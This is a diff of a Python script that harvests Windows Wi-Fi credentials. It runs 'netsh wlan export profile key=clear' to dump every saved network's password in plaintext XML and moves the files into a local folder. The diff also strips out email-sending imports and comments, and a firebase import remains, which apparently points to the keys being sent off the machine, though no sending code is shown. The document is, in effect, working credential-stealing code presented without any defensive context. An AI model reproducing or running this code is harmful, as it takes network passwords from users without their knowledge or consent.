@@ -3,30 +3,27 @@ import os
 import errno
 import glob
 import shutil
-import smtplib
-from email.message import EmailMessage
 from firebase import firebase
 
-#Creamos una carpeta/folder donde se guardara las claves de wifi
 try:
     os.mkdir('./wifi')
 except OSError as error:
     if error.errno != errno.EEXIST:
         raise
-#Muestra todas las redes wifi que la pc fue conectada
+        
 show = subprocess.check_output(['netsh', 'wlan', 'show', 'profile'])
 networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks'])
-#exporta las claves de wifi en archivos .xml
+
 a = subprocess.check_output(['netsh', 'wlan', 'export', 'profile','key=clear']).decode('utf-8').split('\n')
-#Mover archivos .xml a la carpeta wifi
-source_dir = './' #Inicio de la carpeta 
-dst = './wifi' #Nueva carpeta destinatario 
+
+source_dir = './'
+dst = './wifi'
 try:
     files = glob.iglob(os.path.join(source_dir, "*.xml"))
-    #englobar los archivos a mover
+
     for file in files:
         if os.path.isfile(file):
-            shutil.move(file, dst) #Mover todos los archivos a una nueva carpeta
+            shutil.move(file, dst)
 except:
     print("An exception occurred")
 
